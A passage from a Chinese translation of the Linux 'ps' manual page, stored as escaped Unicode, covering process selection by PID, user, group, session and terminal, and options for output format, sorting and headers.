\u98ce\u683c\u65f6\u65bd\u52a0\u4e8e\u6240\u6709\u8fdb\u7a0b\u96c6\u3002\u5f53\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u9009\u62e9\u8fdb\u7a0b\u65f6\uff0c\u8be5\u8fdb\u7a0b\u96c6\u5c06 \u88ab\u6dfb\u52a0\u5230\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9009\u62e9\u7684\u8fdb\u7a0b\u96c6\u4e2d\u3002\u53e6\u4e00\u79cd\u63cf\u8ff0\u662f\uff0c\u6b64\u9009\u9879\u4f7f ps \u5217\u51fa\u6240\u6709\u5177\u6709 \u7ec8\u7aef (tty) \u7684\u8fdb\u7a0b\uff0c\u6216\u4e0e x \u9009\u9879\u4e00\u8d77\u4f7f\u7528\u65f6\u5217\u51fa\u6240\u6709\u8fdb\u7a0b\u3002 -A \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e -e \u76f8\u540c\u3002 -a \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\uff0c\u4f46\u4f1a\u6392\u9664\u4f1a\u8bdd\u9886\u5bfc\u8005\uff08\u53c2\u89c1 getsid(2)\uff09\u548c\u672a\u4e0e\u7ec8\u7aef\u5173\u8054\u7684\u8fdb\u7a0b\u3002 -d \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\uff0c\u4f46\u6392\u9664\u4f1a\u8bdd\u9886\u5bfc\u8005\u3002 --deselect \u9009\u62e9\u6240\u6709\u4e0d\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u8fdb\u7a0b\uff08\u5426\u5b9a\u9009\u62e9\uff09\u3002\u4e0e -N \u76f8\u540c\u3002 -e \u9009\u62e9\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e -A \u76f8\u540c\u3002 g \u771f\u6b63\u6240\u6709\u8fdb\u7a0b\uff0c\u751a\u81f3\u5305\u62ec\u4f1a\u8bdd\u9886\u5bfc\u8005\u3002\u6b64\u6807\u5fd7\u5df2\u8fc7\u65f6\uff0c\u53ef\u80fd\u5728\u5c06\u6765\u7684\u7248\u672c\u4e2d\u5f03\u7528\u3002 \u901a\u5e38\u7531 a \u6807\u5fd7\u9690\u542b\uff0c\u4ec5\u5728 sunos4 \u4e2a\u6027\u64cd\u4f5c\u65f6\u6709\u7528\u3002 -N \u9009\u62e9\u6240\u6709\u4e0d\u7b26\u5408\u6307\u5b9a\u6761\u4ef6\u7684\u8fdb\u7a0b\uff08\u5426\u5b9a\u9009\u62e9\uff09\u3002\u4e0e --deselect \u76f8\u540c\u3002 T \u9009\u62e9\u4e0e\u6b64\u7ec8\u7aef\u5173\u8054\u7684\u6240\u6709\u8fdb\u7a0b\u3002\u4e0e\u4e0d\u5e26\u4efb\u4f55\u53c2\u6570\u7684 t \u9009\u9879\u76f8\u540c\u3002 r \u5c06\u9009\u62e9\u9650\u5236\u4e3a\u4ec5\u8fd0\u884c\u7684\u8fdb\u7a0b\u3002 x \u89e3\u9664 BSD \u98ce\u683c\u7684\u201c\u5fc5\u987b\u6709 tty\u201d\u9650\u5236\uff0c\u8be5\u9650\u5236\u5728\u4f7f\u7528\u67d0\u4e9b BSD \u98ce\u683c\uff08\u4e0d\u5e26\u201c-\u201d\uff09\u9009\u9879 \u6216 ps \u4e2a\u6027\u8bbe\u7f6e\u4e3a BSD \u98ce\u683c\u65f6\u65bd\u52a0\u4e8e\u6240\u6709\u8fdb\u7a0b\u96c6\u3002\u5f53\u4ee5\u8fd9\u79cd\u65b9\u5f0f\u9009\u62e9\u8fdb\u7a0b\u65f6\uff0c\u8be5 \u8fdb\u7a0b\u96c6\u5c06\u88ab\u6dfb\u52a0\u5230\u901a\u8fc7\u5176\u4ed6\u65b9\u5f0f\u9009\u62e9\u7684\u8fdb\u7a0b\u96c6\u4e2d\u3002\u53e6\u4e00\u79cd\u63cf\u8ff0\u662f\uff0c\u6b64\u9009\u9879\u4f7f ps \u5217\u51fa \u6240\u6709\u60a8\u62e5\u6709\u7684\u8fdb\u7a0b\uff08\u4e0e ps \u76f8\u540c\u7684 EUID\uff09\uff0c\u6216\u4e0e a \u9009\u9879\u4e00\u8d77\u4f7f\u7528\u65f6\u5217\u51fa\u6240\u6709\u8fdb\u7a0b\u3002 \u6309\u5217\u8868\u9009\u62e9\u8fdb\u7a0b \u8fd9\u4e9b\u9009\u9879\u63a5\u53d7\u4ee5\u7a7a\u683c\u5206\u9694\u6216\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u5f62\u5f0f\u7684\u5355\u4e2a\u53c2\u6570\u3002\u53ef\u4ee5\u591a\u6b21\u4f7f\u7528\u3002\u4f8b\u5982\uff1a ps -p \"1 2\" -p 3,4 -123 \u4e0e --pid 123 \u76f8\u540c\u3002 123 \u4e0e --pid 123 \u76f8\u540c\u3002 -C cmdlist \u6309\u547d\u4ee4\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u53ef\u6267\u884c\u540d\u79f0\u5728 cmdlist \u4e2d\u7ed9\u51fa\u7684\u8fdb\u7a0b\u3002\u6ce8\u610f\uff1a\u547d\u4ee4\u540d\u79f0\u4e0e \u547d\u4ee4\u884c\u4e0d\u540c\u3002\u4ee5\u524d\u7248\u672c\u7684 procps \u548c\u5185\u6838\u5c06\u6b64\u547d\u4ee4\u540d\u79f0\u622a\u65ad\u4e3a 15 \u4e2a\u5b57\u7b26\u3002\u6b64\u9650\u5236\u5728 \u4e24\u8005\u4e2d\u90fd\u4e0d\u518d\u5b58\u5728\u3002\u5982\u679c\u60a8\u4f9d\u8d56\u4e8e\u5339\u914d\u4ec5 15 \u4e2a\u5b57\u7b26\uff0c\u60a8\u53ef\u80fd\u4e0d\u518d\u5339\u914d\u3002 -G grplist \u6309\u5b9e\u9645\u7ec4 ID (RGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u5b9e\u9645\u7ec4\u540d\u79f0\u6216 ID \u5728 grplist \u5217\u8868\u4e2d\u7684 \u8fdb\u7a0b\u3002\u5b9e\u9645\u7ec4 ID \u6807\u8bc6\u521b\u5efa\u8fdb\u7a0b\u7684\u7528\u6237\u7684\u7ec4\uff0c\u8bf7\u53c2\u89c1 getgid(2)\u3002 -g grplist \u6309\u4f1a\u8bdd\u6216\u6709\u6548\u7ec4\u540d\u9009\u62e9\u3002\u8bb8\u591a\u6807\u51c6\u6307\u5b9a\u6309\u4f1a\u8bdd\u9009\u62e9\uff0c\u4f46\u6309\u6709\u6548\u7ec4\u9009\u62e9\u662f\u5176\u4ed6\u51e0\u4e2a\u64cd\u4f5c \u7cfb\u7edf\u4f7f\u7528\u7684\u903b\u8f91\u884c\u4e3a\u3002\u5f53\u5217\u8868\u5b8c\u5168\u662f\u6570\u5b57\u65f6\uff08\u56e0\u4e3a\u4f1a\u8bdd\u662f\uff09\uff0c\u6b64 ps \u5c06\u6309\u4f1a\u8bdd\u9009\u62e9\u3002 \u7ec4 ID \u53f7\u4ec5\u5728\u540c\u65f6\u6307\u5b9a\u4e00\u4e9b\u7ec4\u540d\u65f6\u6709\u6548\u3002\u53c2\u89c1 -s \u548c --group \u9009\u9879\u3002 --Group grplist \u6309\u5b9e\u9645\u7ec4 ID (RGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -G \u76f8\u540c\u3002 --group grplist \u6309\u6709\u6548\u7ec4 ID (EGID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7ec4\u540d\u79f0\u6216 ID \u5728 grplist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7ec4 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7ec4\uff08\u53c2\u89c1 getegid(2)\uff09\u3002-g \u9009\u9879\u901a\u5e38\u662f --group \u7684\u66ff\u4ee3\u54c1\u3002 p pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\u3002\u4e0e -p \u548c --pid \u76f8\u540c\u3002 -p pidlist \u6309 PID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u8fdb\u7a0b ID \u53f7\u51fa\u73b0\u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u4e0e p \u548c --pid \u76f8\u540c\u3002 --pid pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\u3002\u4e0e -p \u548c p \u76f8\u540c\u3002 --ppid pidlist \u6309\u7236\u8fdb\u7a0b ID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u7236\u8fdb\u7a0b ID \u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u9009\u62e9 \u8fd9\u4e9b pidlist \u4e2d\u5217\u51fa\u7684\u8fdb\u7a0b\u7684\u5b50\u8fdb\u7a0b\u3002 q pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u4e0e -q \u548c --quick-pid \u76f8\u540c\u3002 -q pidlist \u6309 PID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u8fd9\u9009\u62e9\u8fdb\u7a0b ID \u53f7\u51fa\u73b0\u5728 pidlist \u4e2d\u7684\u8fdb\u7a0b\u3002\u5728\u6b64\u9009\u9879 \u4e0b\uff0cps \u4ec5\u8bfb\u53d6 pidlist \u4e2d\u5217\u51fa\u7684 pid \u6240\u9700\u7684\u4fe1\u606f\uff0c\u5e76\u4e14\u4e0d\u5e94\u7528\u5176\u4ed6\u8fc7\u6ee4\u89c4\u5219\u3002 pid \u7684\u987a\u5e8f\u662f\u672a\u6392\u5e8f\u7684\uff0c\u5e76\u4fdd\u6301\u4e0d\u53d8\u3002\u5728\u6b64\u6a21\u5f0f\u4e0b\u4e0d\u5141\u8bb8\u5176\u4ed6\u9009\u62e9\u9009\u9879\u3001\u6392\u5e8f\u548c\u68ee\u6797 \u7c7b\u578b\u5217\u8868\u3002\u4e0e q \u548c --quick-pid \u76f8\u540c\u3002 --quick-pid pidlist \u6309\u8fdb\u7a0b ID \u9009\u62e9\uff08\u5feb\u901f\u6a21\u5f0f\uff09\u3002\u4e0e -q \u548c q \u76f8\u540c\u3002 -s sesslist \u6309\u4f1a\u8bdd ID \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u4f1a\u8bdd ID \u6307\u5b9a\u5728 sesslist \u4e2d\u7684\u8fdb\u7a0b\u3002 --sid sesslist \u6309\u4f1a\u8bdd ID \u9009\u62e9\u3002\u4e0e -s \u76f8\u540c\u3002 t ttylist \u6309 tty \u9009\u62e9\u3002\u51e0\u4e4e\u4e0e -t \u548c --tty \u76f8\u540c\uff0c\u4f46\u4e5f\u53ef\u4ee5\u4e0e\u7a7a ttylist \u4e00\u8d77\u4f7f\u7528\u4ee5\u6307\u793a \u4e0e ps \u5173\u8054\u7684\u7ec8\u7aef\u3002\u4f7f\u7528 T \u9009\u9879\u6bd4\u4f7f\u7528\u5e26\u7a7a ttylist \u7684 t \u66f4\u5e72\u51c0\u3002 -t ttylist \u6309 tty \u9009\u62e9\u3002\u8fd9\u9009\u62e9\u4e0e ttylist \u4e2d\u7ed9\u5b9a\u7684\u7ec8\u7aef\u5173\u8054\u7684\u8fdb\u7a0b\u3002\u7ec8\u7aef\uff08tty\uff0c\u6216\u7528\u4e8e\u6587\u672c \u8f93\u51fa\u7684\u5c4f\u5e55\uff09\u53ef\u4ee5\u4ee5\u51e0\u79cd\u5f62\u5f0f\u6307\u5b9a\uff1a/dev/ttyS1\uff0cttyS1\uff0cS1\u3002\u53ef\u4ee5\u4f7f\u7528\u666e\u901a\u7684\u201c-\u201d\u6765\u9009\u62e9 \u672a\u9644\u52a0\u5230\u4efb\u4f55\u7ec8\u7aef\u7684\u8fdb\u7a0b\u3002 --tty ttylist \u6309\u7ec8\u7aef\u9009\u62e9\u3002\u4e0e -t \u548c t \u76f8\u540c\u3002 U userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7528\u6237\u540d\u6216 ID \u5728 userlist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7528\u6237 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\uff08\u53c2\u89c1 geteuid(2)\uff09\u3002\u4e0e -u \u548c --user \u76f8\u540c\u3002 -U userlist \u6309\u5b9e\u9645\u7528\u6237 ID (RUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u5b9e\u9645\u7528\u6237\u540d\u6216 ID \u5728 userlist \u5217\u8868\u4e2d \u7684\u8fdb\u7a0b\u3002\u5b9e\u9645\u7528\u6237 ID \u6807\u8bc6\u521b\u5efa\u8fdb\u7a0b\u7684\u7528\u6237\uff0c\u8bf7\u53c2\u89c1 getuid(2)\u3002 -u userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u8fd9\u9009\u62e9\u6709\u6548\u7528\u6237\u540d\u6216 ID \u5728 userlist \u4e2d\u7684\u8fdb\u7a0b\u3002 \u6709\u6548\u7528\u6237 ID \u63cf\u8ff0\u8fdb\u7a0b\u4f7f\u7528\u7684\u6587\u4ef6\u8bbf\u95ee\u6743\u9650\u7684\u7528\u6237\uff08\u53c2\u89c1 geteuid(2)\uff09\u3002\u4e0e U \u548c --user \u76f8\u540c\u3002 --User userlist \u6309\u5b9e\u9645\u7528\u6237 ID (RUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -U \u76f8\u540c\u3002 --user userlist \u6309\u6709\u6548\u7528\u6237 ID (EUID) \u6216\u540d\u79f0\u9009\u62e9\u3002\u4e0e -u \u548c U \u76f8\u540c\u3002 \u8f93\u51fa\u683c\u5f0f\u63a7\u5236 \u8fd9\u4e9b\u9009\u9879\u7528\u4e8e\u9009\u62e9 ps \u663e\u793a\u7684\u4fe1\u606f\u3002\u8f93\u51fa\u53ef\u80fd\u56e0\u4e2a\u6027\u800c\u5f02\u3002 -c \u5bf9 -l \u9009\u9879\u663e\u793a\u4e0d\u540c\u7684\u8c03\u5ea6\u5668\u4fe1\u606f\u3002 --context \u663e\u793a\u5b89\u5168\u4e0a\u4e0b\u6587\u683c\u5f0f\uff08\u9488\u5bf9 SELinux\uff09\u3002 -f \u5b8c\u6574\u683c\u5f0f\u5217\u8868\u3002\u6b64\u9009\u9879\u53ef\u4ee5\u4e0e\u8bb8\u591a\u5176\u4ed6 UNIX \u98ce\u683c\u9009\u9879\u7ed3\u5408\u4f7f\u7528\uff0c\u4ee5\u6dfb\u52a0\u989d\u5916\u7684\u5217\u3002 \u5b83\u8fd8\u4f1a\u6253\u5370\u547d\u4ee4\u53c2\u6570\u3002\u4e0e -L \u7ed3\u5408\u4f7f\u7528\u65f6\uff0c\u5c06\u6dfb\u52a0 NLWP\uff08\u7ebf\u7a0b\u6570\uff09\u548c LWP\uff08\u7ebf\u7a0b ID\uff09 \u5217\u3002\u53c2\u89c1 c \u9009\u9879\u3001\u683c\u5f0f\u5173\u952e\u5b57 args \u548c\u683c\u5f0f\u5173\u952e\u5b57 comm\u3002 -F \u989d\u5916\u5b8c\u6574\u683c\u5f0f\u3002\u53c2\u89c1 -f \u9009\u9879\uff0c-F \u9690\u542b\u8be5\u9009\u9879\u3002 --format format \u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e -o \u548c o \u76f8\u540c\u3002 j BSD \u4f5c\u4e1a\u63a7\u5236\u683c\u5f0f\u3002 -j \u4f5c\u4e1a\u683c\u5f0f\u3002 l \u663e\u793a BSD \u957f\u683c\u5f0f\u3002 -l \u957f\u683c\u5f0f\u3002-y \u9009\u9879\u901a\u5e38\u4e0e\u6b64\u9009\u9879\u4e00\u8d77\u4f7f\u7528\u5f88\u6709\u7528\u3002 -M \u6dfb\u52a0\u4e00\u5217\u5b89\u5168\u6570\u636e\u3002\u4e0e Z \u76f8\u540c\uff08\u9488\u5bf9 SELinux\uff09\u3002 O format \u9884\u52a0\u8f7d\u7684 o\uff08\u91cd\u8f7d\uff09\u3002BSD O \u9009\u9879\u53ef\u4ee5\u50cf -O\uff08\u5e26\u6709\u4e00\u4e9b\u9884\u5b9a\u4e49\u5b57\u6bb5\u7684\u7528\u6237\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f\uff09 \u4e00\u6837\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u4f7f\u7528\u542f\u53d1\u5f0f\u65b9\u6cd5\u786e\u5b9a\u6b64\u9009\u9879\u7684\u884c\u4e3a\u3002\u4e3a\u4e86\u786e\u4fdd \u83b7\u5f97\u6240\u9700\u7684\u884c\u4e3a\uff08\u6392\u5e8f\u6216\u683c\u5f0f\uff09\uff0c\u8bf7\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6307\u5b9a\u9009\u9879\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -O \u6216 --sort\uff09\u3002 \u5f53\u7528\u4f5c\u683c\u5f0f\u9009\u9879\u65f6\uff0c\u5b83\u4e0e -O \u76f8\u540c\uff0c\u5e26\u6709 BSD \u4e2a\u6027\u3002 -O format \u7c7b\u4f3c\u4e8e -o\uff0c\u4f46\u9884\u52a0\u8f7d\u4e86\u4e00\u4e9b\u9ed8\u8ba4\u5217\u3002\u4e0e -o pid,format,state,tname,time,command \u6216 -o pid,format,tname,time,cmd \u76f8\u540c\uff0c\u53c2\u89c1\u4e0b\u6587 -o\u3002 o format \u6307\u5b9a\u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u4e0e -o \u548c --format \u76f8\u540c\u3002 -o format \u7528\u6237\u5b9a\u4e49\u7684\u683c\u5f0f\u3002\u683c\u5f0f\u662f\u4ee5\u7a7a\u683c\u5206\u9694\u6216\u9017\u53f7\u5206\u9694\u7684\u5217\u8868\u5f62\u5f0f\u7684\u5355\u4e2a\u53c2\u6570\uff0c\u63d0\u4f9b\u4e00\u79cd \u6307\u5b9a\u5355\u72ec\u8f93\u51fa\u5217\u7684\u65b9\u6cd5\u3002\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u63cf\u8ff0\u4e86\u5df2\u8bc6\u522b\u7684\u5173\u952e\u5b57\u3002\u53ef\u4ee5\u6839\u636e \u9700\u8981\u91cd\u547d\u540d\u6807\u9898\uff08ps -o pid,ruser=RealUser -o comm=Command\uff09\u3002\u5982\u679c\u6240\u6709\u5217\u6807\u9898\u90fd \u662f\u7a7a\u7684\uff08ps -o pid= -o comm=\uff09\uff0c\u5219\u4e0d\u4f1a\u8f93\u51fa\u6807\u9898\u884c\u3002\u5217\u5bbd\u4f1a\u6839\u636e\u9700\u8981\u589e\u52a0\uff0c\u4ee5\u9002\u5e94 \u5bbd\u6807\u9898\uff1b\u8fd9\u53ef\u7528\u4e8e\u52a0\u5bbd\u8bf8\u5982 WCHAN\uff08ps -o pid,wchan=WIDE-WCHAN-COLUMN -o comm\uff09 \u4e4b\u7c7b\u7684\u5217\u3002\u8fd8\u63d0\u4f9b\u4e86\u663e\u5f0f\u5bbd\u5ea6\u63a7\u5236\uff08ps opid,wchan:42,cmd\uff09\u3002ps -o pid=X,comm=Y \u7684 \u884c\u4e3a\u56e0\u4e2a\u6027\u800c\u5f02\uff1b\u8f93\u51fa\u53ef\u80fd\u662f\u4e00\u4e2a\u540d\u4e3a\u201cX,comm=Y\u201d\u7684\u5217\uff0c\u6216\u4e24\u4e2a\u540d\u4e3a\u201cX\u201d\u548c\u201cY\u201d\u7684\u5217\u3002 \u5f53\u6709\u7591\u95ee\u65f6\uff0c\u8bf7\u4f7f\u7528\u591a\u4e2a -o \u9009\u9879\u3002\u4f7f\u7528 PS_FORMAT \u73af\u5883\u53d8\u91cf\u6307\u5b9a\u6240\u9700\u7684\u9ed8\u8ba4\u503c\uff1b DefSysV \u548c DefBSD \u662f\u5b8f\uff0c\u53ef\u7528\u4e8e\u9009\u62e9\u9ed8\u8ba4\u7684 UNIX \u6216 BSD \u5217\u3002 s \u663e\u793a\u4fe1\u53f7\u683c\u5f0f\u3002 u \u663e\u793a\u9762\u5411\u7528\u6237\u7684\u683c\u5f0f\u3002 v \u663e\u793a\u865a\u62df\u5185\u5b58\u683c\u5f0f\u3002 X \u5bc4\u5b58\u5668\u683c\u5f0f\u3002 -y \u4e0d\u663e\u793a\u6807\u5fd7\uff1b\u7528 rss \u66ff\u4ee3 addr\u3002\u6b64\u9009\u9879\u53ea\u80fd\u4e0e -l \u4e00\u8d77\u4f7f\u7528\u3002 Z \u6dfb\u52a0\u4e00\u5217\u5b89\u5168\u6570\u636e\u3002\u4e0e -M \u76f8\u540c\uff08\u9488\u5bf9 SELinux\uff09\u3002 \u8f93\u51fa\u4fee\u9970\u7b26 c \u663e\u793a\u771f\u5b9e\u7684\u547d\u4ee4\u540d\u79f0\u3002\u6b64\u540d\u79f0\u53d6\u81ea\u53ef\u6267\u884c\u6587\u4ef6\u7684\u540d\u79f0\uff0c\u800c\u4e0d\u662f argv \u503c\u3002\u56e0\u6b64\uff0c\u4e0d\u4f1a \u663e\u793a\u547d\u4ee4\u53c2\u6570\u53ca\u5176\u4efb\u4f55\u4fee\u6539\u3002\u6b64\u9009\u9879\u5b9e\u9645\u4e0a\u5c06 args \u683c\u5f0f\u5173\u952e\u5b57\u8f6c\u6362\u4e3a comm \u683c\u5f0f\u5173\u952e\u5b57\uff1b \u5b83\u4e0e -f \u683c\u5f0f\u9009\u9879\u4ee5\u53ca\u901a\u5e38\u663e\u793a\u547d\u4ee4\u53c2\u6570\u7684\u5404\u79cd BSD \u98ce\u683c\u683c\u5f0f\u9009\u9879\u4e00\u8d77\u4f7f\u7528\u975e\u5e38\u6709\u7528\u3002 \u53c2\u89c1 -f \u9009\u9879\u3001\u683c\u5f0f\u5173\u952e\u5b57 args \u548c\u683c\u5f0f\u5173\u952e\u5b57 comm\u3002 --cols n \u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 --columns n \u8bbe\u7f6e\u5c4f\u5e55\u5bbd\u5ea6\u3002 --cumulative \u5305\u542b\u4e00\u4e9b\u5df2\u6b7b\u4ea1\u7684\u5b50\u8fdb\u7a0b\u6570\u636e\uff08\u4f5c\u4e3a\u7236\u8fdb\u7a0b\u7684\u603b\u548c\uff09\u3002 e \u663e\u793a\u547d\u4ee4\u540e\u7684\u73af\u5883\u3002 f ASCII \u827a\u672f\u8fdb\u7a0b\u5c42\u6b21\u7ed3\u6784\uff08\u68ee\u6797\uff09\u3002 --forest ASCII \u827a\u672f\u8fdb\u7a0b\u6811\u3002 h \u65e0\u6807\u9898\u3002\uff08\u6216\u8005\uff0c\u5728 BSD \u4e2a\u6027\u4e2d\uff0c\u6bcf\u5c4f\u5e55\u4e00\u4e2a\u6807\u9898\uff09\u3002h \u9009\u9879\u5b58\u5728\u95ee\u9898\u3002\u6807\u51c6 BSD ps \u4f7f\u7528\u6b64\u9009\u9879\u5728\u6bcf\u9875\u8f93\u51fa\u4e0a\u6253\u5370\u6807\u9898\uff0c\u4f46\u65e7\u7684 Linux ps \u4f7f\u7528\u6b64\u9009\u9879\u5b8c\u5168\u7981\u7528\u6807\u9898\u3002\u6b64\u7248\u672c \u7684 ps \u9075\u5faa Linux \u7528\u6cd5\uff0c\u9664\u975e\u9009\u62e9\u4e86 BSD \u4e2a\u6027\uff0c\u5426\u5219\u4e0d\u4f1a\u6253\u5370\u6807\u9898\uff0c\u5728\u8fd9\u79cd\u60c5\u51b5\u4e0b\uff0c\u5b83\u4f1a \u5728\u6bcf\u9875\u8f93\u51fa\u4e0a\u6253\u5370\u6807\u9898\u3002\u65e0\u8bba\u5f53\u524d\u4e2a\u6027\u5982\u4f55\uff0c\u60a8\u90fd\u53ef\u4ee5\u4f7f\u7528\u957f\u9009\u9879 --headers \u548c --no-headers \u5206\u522b\u542f\u7528\u6bcf\u9875\u6253\u5370\u6807\u9898\u6216\u5b8c\u5168\u7981\u7528\u6807\u9898\u3002 -H \u663e\u793a\u8fdb\u7a0b\u5c42\u6b21\u7ed3\u6784\uff08\u68ee\u6797\uff09\u3002 --headers \u91cd\u590d\u6807\u9898\u884c\uff0c\u6bcf\u9875\u4e00\u884c\u3002 k spec \u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u6392\u5e8f\u8bed\u6cd5\u4e3a[+|-]key[,[+|-]key[,...]]\u3002\u4ece\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u9009\u62e9 \u591a\u5b57\u6bcd\u952e\u3002\u7531\u4e8e\u9ed8\u8ba4\u65b9\u5411\u662f\u9012\u589e\u7684\u6570\u5b57\u6216\u5b57\u6bcd\u987a\u5e8f\uff0c\u56e0\u6b64\u201c+\u201d\u662f\u53ef\u9009\u7684\u3002\u4e0e --sort \u76f8\u540c\u3002 \u793a\u4f8b\uff1a ps jaxkuid,-ppid,+pid ps axk comm o comm,args ps kstart_time -ef --lines n \u8bbe\u7f6e\u5c4f\u5e55\u9ad8\u5ea6\u3002 n WCHAN \u548c USER\uff08\u5305\u62ec\u6240\u6709\u7c7b\u578b\u7684 UID \u548c GID\uff09\u4f7f\u7528\u6570\u5b57\u8f93\u51fa\u3002 --no-headers \u5b8c\u5168\u4e0d\u6253\u5370\u6807\u9898\u884c\u3002--no-heading \u662f\u6b64\u9009\u9879\u7684\u522b\u540d\u3002 O order \u6392\u5e8f\u987a\u5e8f\uff08\u91cd\u8f7d\uff09\u3002BSD O \u9009\u9879\u53ef\u4ee5\u50cf -O\uff08\u5e26\u6709\u4e00\u4e9b\u9884\u5b9a\u4e49\u5b57\u6bb5\u7684\u7528\u6237\u5b9a\u4e49\u8f93\u51fa\u683c\u5f0f\uff09 \u4e00\u6837\u8fd0\u884c\uff0c\u4e5f\u53ef\u4ee5\u7528\u4e8e\u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u4f7f\u7528\u542f\u53d1\u5f0f\u65b9\u6cd5\u786e\u5b9a\u6b64\u9009\u9879\u7684\u884c\u4e3a\u3002\u4e3a\u4e86\u786e\u4fdd\u83b7\u5f97 \u6240\u9700\u7684\u884c\u4e3a\uff08\u6392\u5e8f\u6216\u683c\u5f0f\uff09\uff0c\u8bf7\u4ee5\u5176\u4ed6\u65b9\u5f0f\u6307\u5b9a\u9009\u9879\uff08\u4f8b\u5982\uff0c\u4f7f\u7528 -O \u6216 --sort\uff09\u3002 \u5bf9\u4e8e\u6392\u5e8f\uff0c\u8fc7\u65f6\u7684 BSD O \u9009\u9879\u8bed\u6cd5\u662f O[+|-]k1[,[+|-]k2[,...]]\u3002\u5b83\u6839\u636e\u7531\u4e00\u7cfb\u5217 \u77ed\u952e k1,k2,... \u63cf\u8ff0\u7684\u591a\u7ea7\u6392\u5e8f\u987a\u5e8f\u5bf9\u8fdb\u7a0b\u5217\u8868\u8fdb\u884c\u6392\u5e8f\u3002\"+\" \u76ee\u524d\u662f\u53ef\u9009\u7684\uff0c\u4ec5 \u91cd\u7533\u952e\u4e0a\u7684\u9ed8\u8ba4\u65b9\u5411\uff0c\u4f46\u53ef\u4ee5\u5e2e\u52a9\u533a\u5206 O \u6392\u5e8f\u548c O \u683c\u5f0f\u3002\"\u2013\" \u4ec5\u5728\u5176\u524d\u9762\u7684\u952e\u4e0a\u53cd\u8f6c\u65b9\u5411\u3002 --rows n \u8bbe\u7f6e\u5c4f\u5e55\u9ad8\u5ea6\u3002 S \u6c47\u603b\u4e00\u4e9b\u4fe1\u606f\uff0c\u4f8b\u5982 CPU \u4f7f\u7528\u60c5\u51b5\uff0c\u4ece\u5df2\u6b7b\u4ea1\u7684\u5b50\u8fdb\u7a0b\u4e2d\u6c47\u603b\u5230\u5b83\u4eec\u7684\u7236\u8fdb\u7a0b\u4e2d\u3002\u8fd9\u5bf9\u4e8e \u68c0\u67e5\u4e00\u4e2a\u7236\u8fdb\u7a0b\u91cd\u590d\u6d3e\u751f\u77ed\u751f\u547d\u5468\u671f\u5b50\u8fdb\u7a0b\u8fdb\u884c\u5de5\u4f5c\u7684\u7cfb\u7edf\u5f88\u6709\u7528\u3002 --sort spec \u6307\u5b9a\u6392\u5e8f\u987a\u5e8f\u3002\u6392\u5e8f\u8bed\u6cd5\u4e3a[+|-]key[,[+|-]key[,...]]\u3002\u4ece\u6807\u51c6\u683c\u5f0f\u8bf4\u660e\u7b26\u90e8\u5206\u4e2d\u9009\u62e9\u591a \u5b57\u6bcd\u952e\u3002\u7531\u4e8e\u9ed8\u8ba4\u65b9\u5411\u662f\u9012\u589e\u7684\u6570\u5b57\u6216\u5b57\u6bcd\u987a\u5e8f\uff0c\u56e0\u6b64\u201c+\u201d\u662f\u53ef\u9009\u7684\u3002\u4e0e k \u76f8\u540c\u3002 \u4f8b\u5982\uff1aps jax --sort=uid,-ppid,+pid w \u5bbd\u8f93\u51fa\u3002\u6b64\u9009\u9879\u4f7f\u7528\u4e24\u6b21\u4ee5\u83b7\u5f97\u65e0\u9650\u5bbd\u5ea6\u3002 -w \u5bbd\u8f93\u51fa\u3002\u6b64\u9009\u9879\u4f7f\u7528\u4e24\u6b21\u4ee5\u83b7\u5f97\u65e0\u9650\u5bbd\u5ea6\u3002 --width n 